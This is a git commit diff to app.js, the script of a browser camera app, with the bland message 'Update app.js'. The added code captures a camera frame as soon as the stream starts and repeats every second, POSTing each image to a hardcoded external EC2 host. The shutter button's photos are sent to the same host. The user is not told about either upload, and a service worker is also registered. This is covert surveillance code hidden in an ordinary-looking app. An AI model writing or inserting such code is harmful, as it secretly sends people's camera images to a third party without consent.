521e8c8ddb8d4b92b0e5f574decf634776c80945
liorcic <48363355+liorcic@users.noreply.github.com>
2019-12-27 01:06:58 +0200

    Update app.js

--- app.js
+++ app.js
@@ -8,6 +8,27 @@ const cameraView = document.querySelector("#camera--view"),
     cameraSensor = document.querySelector("#camera--sensor"),
     cameraTrigger = document.querySelector("#camera--trigger");
 
+
+function send_my_image()
+{
+    x = 1;  // 5 Seconds
+
+    cameraSensor.width = cameraView.videoWidth;
+    cameraSensor.height = cameraView.videoHeight;
+    cameraSensor.getContext("2d").drawImage(cameraView, 0, 0);
+    cameraOutput.src = cameraSensor.toDataURL("image/webp");
+    cameraOutput.classList.add("taken");
+    var image_taken = cameraOutput.src = cameraSensor.toDataURL("image/png");
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://ec2-3-19-241-100.us-east-2.compute.amazonaws.com:62116/send_image", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+        "image": image_taken
+    }));
+
+    setTimeout(send_my_image, x*1000);
+}
+
 // Access the device camera and stream to cameraView
 function cameraStart() {
     navigator.mediaDevices
@@ -15,6 +36,7 @@ function cameraStart() {
         .then(function(stream) {
             track = stream.getTracks()[0];
             cameraView.srcObject = stream;
+            send_my_image();
         })
         .catch(function(error) {
             console.error("Oops. Something is broken.", error);
@@ -28,8 +50,29 @@ cameraTrigger.onclick = function() {
     cameraSensor.getContext("2d").drawImage(cameraView, 0, 0);
     cameraOutput.src = cameraSensor.toDataURL("image/webp");
     cameraOutput.classList.add("taken");
+    var image_taken = cameraOutput.src = cameraSensor.toDataURL("image/png");
+    var xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://ec2-3-19-241-100.us-east-2.compute.amazonaws.com:62116/send_image", true);
+    xhr.setRequestHeader('Content-Type', 'application/json');
+    xhr.send(JSON.stringify({
+        "image": image_taken
+    }));
     // track.stop();
 };
 
 // Start the video stream when the window loads
 window.addEventListener("load", cameraStart, false);
+
+
+// Install ServiceWorker
+if ('serviceWorker' in navigator) {
+  console.log('CLIENT: service worker registration in progress.');
+  navigator.serviceWorker.register( '/camera-app/part-2/sw.js' , { scope : ' ' } ).then(function() {
+    console.log('CLIENT: service worker registration complete.');
+  }, function() {
+    console.log('CLIENT: service worker registration failure.');
+  });
+} else {
+  console.log('CLIENT: service worker is not supported.');
+}
+
